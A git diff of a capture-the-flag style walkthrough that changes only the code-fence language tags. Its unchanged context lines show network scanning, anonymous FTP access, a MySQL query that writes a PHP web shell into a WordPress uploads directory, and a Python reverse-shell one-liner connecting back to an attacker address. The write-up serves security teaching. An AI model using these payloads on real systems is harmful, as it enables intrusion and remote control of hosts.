@@ -66,7 +66,7 @@ As mentioned previously- if you want to learn more about the proper procedures a
 
 So let's start the process by running `netdiscover` on our network to find the IP of our Target VM.
 
-```console
+```bash
  Currently scanning: 192.168.23.0/16   |   Screen View: Unique Hosts           
                                                                                
  4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240               
@@ -80,7 +80,7 @@ So let's start the process by running `netdiscover` on our network to find the I
 
 The IP of **192.168.1.13** will be our target. The next step will be to run an nmap scan on our target, so that we can enumerate any open ports, services, versions, and OS's.
 
-```console
+```bash
 root@kali:~# nmap -sS -A -O -n -p1-60000 192.168.1.13
 
 Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-10-04 18:33 CDT
@@ -153,7 +153,7 @@ We can see that there are a ton of valuable (and possibly vulnerable) ports open
 
 The first thing that caught my eye was the fact that FTP was allowing anonymous logins. So I made this my first target. Let's go ahead and login to FTP with the username: **anonymous** and the password: **anonymous**.
 
-```console
+```bash
 root@kali:~# ftp 192.168.1.13
 Connected to 192.168.1.13.
 220-
@@ -718,7 +718,7 @@ Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 
 From here, I went ahead and tried to find the passwords in WordPress.
 
-```console
+```sql
 mysql> show databases;
 +--------------------+
 | Database           |
@@ -806,7 +806,7 @@ I got the idea from [InfoSec Institute](http://resources.infosecinstitute.com/an
 
 So what we do is type in the following command in the MySQL command line.
 
-```console
+```sql
 mysql> Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
 ```
 
@@ -833,7 +833,7 @@ Once we have netcat listening on our target port, we will go ahead and append th
 
 If we wanted to - we could have used Ruby, or Bash to carry out the reverse tcp shell. But since I really like python and its versatility, I just stuck with it. You can read more on reverse tcp shells from the [PenTest Monekey Reverse Shell CheatSheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
 
-```console
+```python
 python%20-c%20'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.7",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
